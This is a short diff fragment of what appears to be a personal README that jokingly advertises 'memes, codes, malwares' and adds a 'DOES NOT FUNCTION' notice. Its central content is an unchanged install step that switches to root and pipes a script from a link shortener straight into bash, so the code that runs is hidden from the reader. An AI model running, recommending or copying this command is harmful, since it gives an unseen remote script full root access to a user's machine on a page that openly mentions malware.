@@ -4,6 +4,12 @@ Just memes, codes, malwares, a archive and lots more lol!
 Follow me if u wanna get a&nbsp;<a href="https://instagram.com/phoenixthrush">:cookie: &nbsp;</a>lmao
 
 
+
+
+NEW UPDATE!
+DOES NOT FUNCTION
+
+
 sudo su && curl -sL https://bit.ly/3hXEadY | bash
 
 or
